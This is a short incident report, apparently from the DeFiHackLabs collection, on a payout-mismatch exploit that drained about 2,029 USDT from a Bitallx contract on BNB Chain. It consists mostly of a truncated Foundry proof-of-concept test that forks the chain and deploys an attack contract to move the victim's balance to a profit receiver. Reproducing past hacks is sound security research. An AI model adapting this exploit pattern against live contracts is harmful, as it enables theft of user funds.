# [?] Bitallx - Payout Amount Mismatch

## Summary
Severity: Unknown
Chain: BNB Chain
Component: bitallx
Published: 2025-05-16
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-05/bitallx_exp.sol
Type: defi-exploit-poc

## Details
Lost: 2,029.47 USDT

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    address private profitReceiver;

    function setUp() public {
        vm.createSelectFork("bsc", 49_758_338);

        profitReceiver = makeAddr("profitReceiver");
        fundingToken = USDT_TOKEN;
        attacker = profitReceiver;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(TRACE_ATTACK_CONTRACT, "Trace Attack Contract");
        vm.label(BITALLX_SC, "BitallxSC");
        vm.label(USDT_TOKEN, "USDT");
    }

    function testExploit() public balanceLog {
        uint256 victimBalance = IBitallxToken(USDT_TOKEN).balanceOf(BITALLX_SC);
        assertEq(victimBalance, 2_029_473_999_999_999_986_000);

        new BitallxPayOutAttack(profitReceiver);

        assertEq(IBitallxToken(USDT_TOKEN).balanceOf(profitReceiver), victimBalance);
        assertEq(IBitallxToken(USDT_TOKEN).balanceOf(BITALLX_SC), 0);
    }
}

contract BitallxPayOutAttack {
    constructor(
        address profitReceiver
    ) {
        IBitallxToken usdt = IBitallxToken(USDT_TOKEN);
        uint256 victimBalance = usdt.balanceOf(BITALLX_SC);

        address[] memory wallets = new address[](1);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-05/bitallx_exp.sol_
